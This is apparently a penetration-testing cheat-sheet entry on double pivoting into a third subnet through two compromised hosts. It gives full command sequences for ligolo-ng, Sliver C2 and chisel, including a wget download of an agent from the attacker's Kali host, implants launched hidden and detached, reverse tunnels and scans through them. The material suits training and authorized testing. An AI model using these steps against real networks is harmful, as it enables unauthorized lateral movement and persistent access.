title: Double Pivot — Chaining Through Two Hops to Reach a Third Network
body:
A double pivot is needed when: Kali → Pivot1 works, but the target lives on a subnet only Pivot2 can see. Draw the topology before touching anything — knowing which box is the hop to which subnet saves hours.

Before building anything: test whether Kali can already reach the third subnet directly. VPN gateways often route more subnets than you think. `ip route get <third-target>` + `nc -zv -w3 <third-target> <port>` first. If it times out only then build the chain.

The ligolo double-pivot pattern: you already have a session from Pivot1. To reach the third subnet via Pivot2, you need an agent running ON Pivot2 that calls back through Pivot1's existing ligolo tunnel — not directly to Kali.

The key: set up a ligolo TCP listener on the Pivot1 session so Pivot2 can reach your proxy through the first tunnel. Then Pivot2's agent dials Pivot1's internal IP on that listener port.
cmd:
# ══════════════════════════════════════════════════
# STEP 0 — DRAW THE MAP
# ══════════════════════════════════════════════════
# Kali (tun0: 192.168.45.x) 
#   → Pivot1 (192.168.45.x / 192.168.122.x) — ligolo session 1 active
#   → Pivot2 (192.168.122.x / 192.168.176.x) — need to reach this
#   → Target (192.168.176.x) — final destination

# ══════════════════════════════════════════════════
# STEP 1 — VERIFY YOU ACTUALLY NEED THE DOUBLE PIVOT
# ══════════════════════════════════════════════════
# Can Kali reach the third subnet directly via the VPN?
ip route get <third-target-ip>
nc -zv -w3 <third-target-ip> 445
# Connection refused = reachable, no pivot needed
# Timeout = pivot needed

# Can Pivot1 reach Pivot2's third-subnet address?
# (from shell on Pivot1)
Test-NetConnection <third-target-ip> -Port 445    # Windows
nc -zv -w3 <third-target-ip> 445                  # Linux
# This confirms whether Pivot1 is the right hop

# ══════════════════════════════════════════════════
# STEP 2 — ADD LISTENER ON PIVOT1 SESSION
# (so Pivot2 can reach your ligolo proxy through the first tunnel)
# ══════════════════════════════════════════════════
# In ligolo proxy console — select the PIVOT1 session:
session
# pick Pivot1
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
listener_list    # confirm it shows on Pivot1

# This makes Pivot1 accept connections on :11601
# and forward them to your local proxy on 127.0.0.1:11601

# ══════════════════════════════════════════════════
# STEP 3 — GET PIVOT2's INTERNAL IP (the one Pivot2 can reach back to Pivot1)
# ══════════════════════════════════════════════════
# From your Pivot2 shell:
ipconfig /all     # Windows
ip a              # Linux
arp -a            # see what Pivot2 already knows about the network
# You need the IP of Pivot1 on the subnet they SHARE
# e.g. if Pivot1 is 192.168.122.95 and Pivot2 is 192.168.122.96 — use 192.168.122.95

# ══════════════════════════════════════════════════
# STEP 4 — DROP LIGOLO AGENT ON PIVOT2
# ══════════════════════════════════════════════════
# Upload agent to Pivot2 (from your Pivot2 shell via evil-winrm, sliver, etc.)
upload /home/kali/tools/ligolo-ng/agent.exe C:\Windows\Tasks\agent.exe
# or Linux:
wget http://<kali-ip>:<port>/agent -O /tmp/agent && chmod +x /tmp/agent

# ══════════════════════════════════════════════════
# STEP 5 — RUN AGENT ON PIVOT2 POINTING AT PIVOT1
# ══════════════════════════════════════════════════
# The agent connects to Pivot1's listener (NOT to Kali directly)
# Windows — run detached so it doesn't block your shell:
Start-Process C:\Windows\Tasks\agent.exe -ArgumentList '-connect <Pivot1-internal-ip>:11601 -ignore-cert' -WindowStyle Hidden

# Linux:
nohup /tmp/agent -connect <Pivot1-internal-ip>:11601 -ignore-cert &

# ══════════════════════════════════════════════════
# STEP 6 — BIND THE NEW SESSION TO A SECOND TUNNEL INTERFACE
# ══════════════════════════════════════════════════
# Back in ligolo proxy console — new session should appear:
session
# pick Pivot2

# On Kali — create second tunnel interface:
sudo ip tuntap add user root mode tun tunnel2
sudo ip link set tunnel2 up

# In ligolo proxy:
start --tun tunnel2

# ══════════════════════════════════════════════════
# STEP 7 — ROUTE THE TARGET THROUGH TUNNEL2
# ══════════════════════════════════════════════════
# Add route for the third subnet through the Pivot2 tunnel:
sudo ip route add <third-subnet>/24 dev tunnel2
# Or specific host only:
sudo ip route add <third-target-ip>/32 dev tunnel2

# Verify routing:
ip route get <third-target-ip>
# Must say: dev tunnel2

# Test connectivity:
nc -zv -w3 <third-target-ip> <port>
nmap -Pn -sT -p445,5985,3389,80 <third-target-ip>   # -sT required through userland tunnel

# ══════════════════════════════════════════════════
# SLIVER C2 DOUBLE PIVOT (if using Sliver instead)
# ══════════════════════════════════════════════════
# Method: Sliver native TCP pivot listener on Pivot1 session
# In Sliver client, with Pivot1 session selected:
pivots tcp --bind 0.0.0.0:9898
pivots    # confirm listening

# Generate Pivot2 implant pointing at Pivot1's internal IP:
generate --tcp-pivot <Pivot1-internal-ip>:9898 --os windows --arch amd64 --format exe --save pivot2.exe

# Drop and execute on Pivot2 — the beacon rides Pivot2 → Pivot1 → Sliver
# Then use ligolo from within Sliver session for network access

# ══════════════════════════════════════════════════
# CHISEL ALTERNATIVE
# ══════════════════════════════════════════════════
# Kali as server:
chisel server -p 8888 --reverse

# Pivot1 as middle relay — forward Pivot2's callback to Kali:
chisel client <kali-ip>:8888 R:9999:0.0.0.0:9999

# Pivot2 connects to Pivot1:
chisel client <Pivot1-internal-ip>:9999 R:1080:socks

# Now route traffic through the SOCKS proxy with proxychains:
# Add to /etc/proxychains4.conf: socks5 127.0.0.1 1080
proxychains nmap -Pn -sT -p445,5985 <third-target-ip>
warn: The ligolo agent on Pivot2 MUST connect to Pivot1's INTERNAL IP (the one on the shared subnet), not to Kali's tun0 IP. Pivot2 has no route to Kali directly — that's why you're building the double pivot. If the agent doesn't appear in the proxy after 30 seconds, check: (1) the listener is active on Pivot1 with listener_list, (2) the port is not blocked by a host firewall on Pivot1, (3) you used Pivot1's internal IP not its VPN-facing IP. For nmap through the tunnel always use -sT (connect scan) — SYN scans don't work through userland tunnels.
